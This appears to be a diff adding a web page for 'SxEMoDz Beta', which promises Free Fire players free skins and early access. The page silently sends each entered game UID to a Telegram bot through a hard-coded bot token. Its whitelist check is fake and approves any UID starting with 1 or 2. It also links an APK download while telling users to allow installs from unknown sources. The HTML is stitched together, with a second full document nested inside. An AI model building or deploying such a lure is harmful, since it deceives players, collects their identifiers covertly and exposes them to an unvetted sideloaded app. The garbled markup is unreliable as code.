@@ -1,0 +1,511 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SxEMoDz Beta - Home</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto Condensed', sans-serif;
+      overflow-x: hidden;
+    }
+    h1, h2, h3 {
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1.5px;
+    }
+    @keyframes neonPulse {
+      0%, 100% { text-shadow: 0 0 5px #ff0066, 0 0 15px #ff0066, 0 0 25px #ff0066; }
+      50% { text-shadow: 0 0 10px #ff0066, 0 0 20px #ff0066, 0 0 30px #ff0066; }
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(40px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes bgShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    @keyframes particle {
+      0% { transform: translateY(0) scale(1); opacity: 0.8; }
+      100% { transform: translateY(-100vh) scale(0.2); opacity: 0; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes drawTick {
+      0% { stroke-dashoffset: 100; }
+      100% { stroke-dashoffset: 0; }
+    }
+    .neon-glow {
+      animation: neonPulse 1.5s infinite;
+    }
+    .animate-fade-in {
+      animation: fadeInUp 1s ease-out forwards;
+    }
+    .hover-3d {
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .hover-3d:hover {
+      transform: translateY(-8px) scale(1.05);
+      box-shadow: 0 15px 30px rgba(255, 0, 102, 0.6);
+    }
+    .hero-bg {
+      background: linear-gradient(135deg, #ff0066, #ff4500, #4b0082);
+      background-size: 200% 200%;
+      animation: bgShift 10s ease infinite;
+      position: relative;
+    }
+    .card-bg {
+      background: linear-gradient(145deg, #1a1a1a, #2c2c2c);
+      transform-style: preserve-3d;
+      transition: transform 0.5s ease;
+    }
+    .card-bg:hover {
+      transform: rotateY(10deg) rotateX(10deg);
+    }
+    .input-glow {
+      transition: box-shadow 0.3s ease;
+    }
+    .input-glow:focus {
+      box-shadow: 0 0 15px rgba(255, 0, 102, 0.7);
+    }
+    .particles {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: rgba(255, 0, 102, 0.7);
+      border-radius: 50%;
+      animation: particle 5s linear infinite;
+    }
+    .loader {
+      border: 4px solid #1a1a1a;
+      border-top: 4px solid #ff0066;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+      box-shadow: 0 0 10px #ff0066, 0 0 20px #ff0066;
+    }
+    .tick-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      margin-top: 16px;
+    }
+    .tick {
+      width: 40px;
+      height: 20px;
+      position: relative;
+      margin-bottom: 8px;
+    }
+    .tick::before {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 4px;
+      background: #ff0066;
+      transform: rotate(45deg);
+      left: 8px;
+      top: 12px;
+      box-shadow: 0 0 10px #ff0066;
+      animation: drawTick 0.5s ease forwards;
+    }
+    .tick::after {
+      content: '';
+      position: absolute;
+      width: 30px;
+      height: 4px;
+      background: #ff0066;
+      transform: rotate(-45deg);
+      left: 20px;
+      top: 8px;
+      box-shadow: 0 0 10px #ff0066;
+      animation: drawTick 0.5s ease forwards 0.2s;
+    }
+    .enjoy-text {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ff0066;
+      animation: neonPulse 1.5s infinite, fadeInUp 0.7s ease forwards 0.3s;
+      opacity: 0;
+    }
+    .not-working {
+      color: #ff4444;
+      font-size: 1.25rem;
+      font-weight: bold;
+      text-align: center;
+      margin-top: 16px;
+      animation: fadeInUp 0.5s ease forwards;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body class="bg-black text-white min-h-screen flex flex-col">
+  <!-- Header -->
+  <header class="hero-bg py-4 sticky top-0 z-20 shadow-lg">
+    <div class="container mx-auto px-4 flex justify-between items-center">
+      <h1 class="text-4xl font-extrabold neon-glow">SxEMoDz Beta</h1>
+      <nav class="space-x-6 flex items-center">
+        <a href="#home" class="text-xl hover:text-pink-400 transition-colors">Home</a>
+        <a href="#verify" class="text-xl hover:text-pink-400 transition-colors">Verify UID</a>
+        <a href="#features" class="text-xl hover:text-pink-400 transition-colors">Features</a>
+        <a href="#download" class="text-xl hover:text-pink-400 transition-colors">Download</a>
+        <a href="admin.html" class="text-xl hover:text-pink-400 transition-colors">Admin Panel</a>
+        <span id="currentTime" class="text-lg text-gray-300"></span>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section id="home" class="hero-bg py-28 text-center relative overflow-hidden">
+    <div class="particles">
+      <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
+      <div class="particle" style="left: 30%; animation-delay: 1s;"></div>
+      <div class="particle" style="left: 50%; animation-delay: 2s;"></div>
+      <div class="particle" style="left: 70%; animation-delay: 3s;"></div>
+      <div class="particle" style="left: 90%; animation-delay: 4s;"></div>
+    </div>
+    <div class="container mx-auto px-4 animate-fade-in relative z-10">
+      <h2 class="text-5xl md:text-7xl font-extrabold mb-4 neon-glow">SxEMoDz Server</h2>
+      <p class="text-xl md:text-2xl mb-8 text-gray-200 max-w-3xl mx-auto">Join the ultimate Free Fire experience with exclusive beta features, free skins, and early access to new content!</p>
+      <a href="#verify" class="bg-pink-500 text-white px-10 py-4 rounded-full text-xl font-semibold hover:bg-pink-600 hover-3d">Verify Your UID Now</a>
+    </div>
+    <div class="absolute inset-0 opacity-20 pointer-events-none" style="background: radial-gradient(circle, rgba(255,0,102,0.5), transparent);"></div>
+  </section>
+
+  <!-- Verification Section -->
+  <section id="verify" class="py-20 bg-gray-900">
+    <div class="container mx-auto px-4">
+      <h2 class="text-5xl font-bold text-center mb-8 animate-fade-in neon-glow">Verify Your UID</h2>
+      <div class="card-bg p-8 rounded-xl shadow-2xl max-w-md mx-auto hover-3d">
+        <p class="text-gray-300 text-center mb-4">Enter your Free Fire UID to check whitelist and active status.</p>
+        <div class="mb-4">
+          <input id="uidInput" type="text" placeholder="Enter UID (e.g., 123456789)" class="w-full p-3 border rounded-lg bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-pink-500 input-glow">
+        </div>
+        <button id="verifyBtn" class="w-full bg-pink-500 text-white p-3 rounded-lg font-semibold hover:bg-pink-600 hover-3d">Check Whitelist</button>
+        <div id="loader" class="hidden mt-4 loader"></div>
+        <div id="result" class="mt-4 text-center"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features Section -->
+  <section id="features" class="py-20 bg-black">
+    <div class="container mx-auto px-4">
+      <h2 class="text-5xl font-bold text-center mb-8 animate-fade-in neon-glow">Why SxEMoDz?</h2>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+        <div class="card-bg p-6 rounded-xl hover-3d animate-fade-in">
+          <h3 class="text-2xl font-semibold mb-2 text-pink-400">Early Access</h3>
+          <p class="text-gray-300">Play unreleased characters and weapons before anyone else.</p>
+        </div>
+        <div class="card-bg p-6 rounded-xl hover-3d animate-fade-in" style="animation-delay: 0.2s;">
+          <h3 class="text-2xl font-semibold mb-2 text-pink-400">Free Skins</h3>
+          <p class="text-gray-300">Unlock exclusive neon skins and items at no cost.</p>
+        </div>
+        <div class="card-bg p-6 rounded-xl hover-3d animate-fade-in" style="animation-delay: 0.4s;">
+          <h3 class="text-2xl font-semibold mb-2 text-pink-400">Low Ping</h3>
+          <p class="text-gray-300">Enjoy a lag-free, high-performance beta server.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Download Section -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Section</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Neon glow text */
+    .neon-glow {
+      color: #00ffea;
+      text-shadow: 0 0 5px #00ffea, 0 0 10px #00ffea, 0 0 20px #00ffea;
+    }
+
+    /* Fade-in animation */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 1.2s ease-out;
+    }
+
+    /* 3D hover effect */
+    .hover-3d:hover {
+      transform: translateY(-10px) scale(1.02);
+      transition: all 0.3s ease;
+    }
+
+    /* Card background */
+    .card-bg {
+      background: linear-gradient(145deg, #1e293b, #0f172a);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    /* Button glow */
+    .glow-btn {
+      background: linear-gradient(45deg, #22c55e, #16a34a);
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.7);
+      transition: all 0.3s ease;
+    }
+    .glow-btn:hover {
+      box-shadow: 0 0 25px rgba(34, 197, 94, 0.9);
+      transform: scale(1.05);
+    }
+    .glow-btn:active {
+      transform: scale(0.95);
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white">
+
+  <section id="download" class="py-20">
+    <div class="container mx-auto px-4">
+      <h2 class="text-5xl font-bold text-center mb-8 animate-fade-in neon-glow">
+        Download SxEMoDz Beta
+      </h2>
+
+      <div class="card-bg p-8 rounded-xl shadow-2xl max-w-md mx-auto hover-3d">
+        <p class="text-gray-300 text-center mb-4">
+          Get the latest SxEMoDz Beta APK for Android.
+        </p>
+
+        <!-- Stylish Download Button -->
+        <a href="https://www.mediafire.com/file/ffgel6orc6mhj8n/FFKIPAS.apk/file" 
+           class="block w-full p-3 rounded-lg font-semibold text-center glow-btn">
+          📥 Download APK (v1.0)
+        </a>
+
+        <p class="text-gray-400 text-sm mt-2 text-center">
+          Note: Ensure your device allows installations from unknown sources.
+        </p>
+      </div>
+    </div>
+  </section>
+
+</body>
+</html>
+
+
+  <!-- Footer -->
+  <footer class="hero-bg py-6 text-center">
+    <p class="text-lg">&copy; 2025 SxEMoDz Beta. All rights reserved.</p>
+  </footer>
+
+  <script>
+    // Real-time clock in Nepal (+0545)
+    function updateTime() {
+      const options = {
+        timeZone: 'Asia/Kathmandu',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+      };
+      const time = new Date().toLocaleTimeString('en-US', options);
+      document.getElementById('currentTime').textContent = `Time: ${time} (+0545)`;
+    }
+    updateTime();
+    setInterval(updateTime, 1000);
+
+    document.getElementById('verifyBtn').addEventListener('click', async () => {
+      const uid = document.getElementById('uidInput').value.trim();
+      const resultDiv = document.getElementById('result');
+      const loader = document.getElementById('loader');
+      const verifyBtn = document.getElementById('verifyBtn');
+
+      if (!uid) {
+        resultDiv.innerHTML = '<p class="text-red-500">Please enter a valid UID.</p>';
+        return;
+      }
+
+      // Input validation: Ensure UID is numeric and 8-12 digits
+      if (!/^\d{8,12}$/.test(uid)) {
+        resultDiv.innerHTML = '<p class="not-working">Not Working: UID must be 8-12 digits.</p>';
+        return;
+      }
+
+      // Show loader and disable button
+      loader.classList.remove('hidden');
+      verifyBtn.disabled = true;
+      resultDiv.innerHTML = '';
+
+      let success = false;
+      let isActive = false;
+
+      try {
+        // Save UID to localStorage with default inactive status if new
+        try {
+          const uids = JSON.parse(localStorage.getItem('uids') || '[]');
+          if (!uids.some(entry => entry.uid === uid)) {
+            uids.push({ uid, isActive: false });
+            localStorage.setItem('uids', JSON.stringify(uids));
+          }
+          isActive = uids.find(entry => entry.uid === uid).isActive;
+        } catch (error) {
+          console.error('Failed to save UID to localStorage:', error);
+        }
+
+        // Send UID to Telegram bot (silent error)
+        try {
+          await sendToTelegram(uid);
+        } catch (error) {
+          console.error('Telegram error (silent):', error);
+        }
+
+        // Verify UID with proxy endpoint
+        try {
+          const response = await verifyWithApi(uid);
+          success = true;
+        } catch (error) {
+          console.error('API verification error (silent):', error);
+          // Fallback to mock verification
+          try {
+            await mockCheckWhitelist(uid);
+            success = true;
+          } catch (mockError) {
+            console.error('Mock verification error (silent):', mockError);
+            success = false;
+          }
+        }
+      } finally {
+        // Hide loader and re-enable button
+        loader.classList.add('hidden');
+        verifyBtn.disabled = false;
+      }
+
+      // Display result based on success
+      if (success) {
+        resultDiv.innerHTML = `
+          <div class="tick-container">
+            <div class="tick"></div>
+            <p class="enjoy-text">Enjoy!</p>
+          </div>
+          <p class="text-gray-300 mt-2">Status: ${isActive ? 'Active' : 'Inactive'}.</p>
+        `;
+      } else {
+        resultDiv.innerHTML = '<p class="not-working">Not Working: UID is not whitelisted.</p>';
+      }
+    });
+
+    // Function to send UID to Telegram bot
+    async function sendToTelegram(uid) {
+      const botToken = '7881073651:AAFnY6mS_HcCSbHw0dDhsJpaaY4QUN88cak';
+      const chatId = '7016242026';
+      const message = `New UID submitted: ${uid}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      const data = await response.json();
+      if (!response.ok) {
+        throw new Error(data.description || 'Unknown Telegram API error');
+      }
+    }
+
+    // Function to verify UID with proxy endpoint
+    async function verifyWithApi(uid) {
+      const url = 'http://localhost:3000/verifyuid';
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid }),
+        signal: controller.signal
+      });
+
+      clearTimeout(timeoutId);
+
+      if (response.status === 0 || response.type === 'error') {
+        throw new Error('Network error (check proxy server or DNS settings)');
+      }
+
+      const data = await response.json();
+      if (!response.ok || !data.whitelisted) {
+        throw new Error(data.message || 'UID verification failed');
+      }
+      return { message: `UID ${uid} is whitelisted!` };
+    }
+
+    // Mock function for fallback whitelist verification
+    async function mockCheckWhitelist(uid) {
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      const uids = JSON.parse(localStorage.getItem('uids') || '[]');
+      const uidEntry = uids.find(entry => entry.uid === uid);
+      const isActive = uidEntry ? uidEntry.isActive : false;
+      
+      if (uid.startsWith('1') || uid.startsWith('2')) {
+        return { message: `UID ${uid} is whitelisted! Status: ${isActive ? 'Active' : 'Inactive'}.` };
+      } else {
+        throw new Error(`UID ${uid} is not whitelisted or invalid.`);
+      }
+    }
+  </script>
+</body>
+</html>
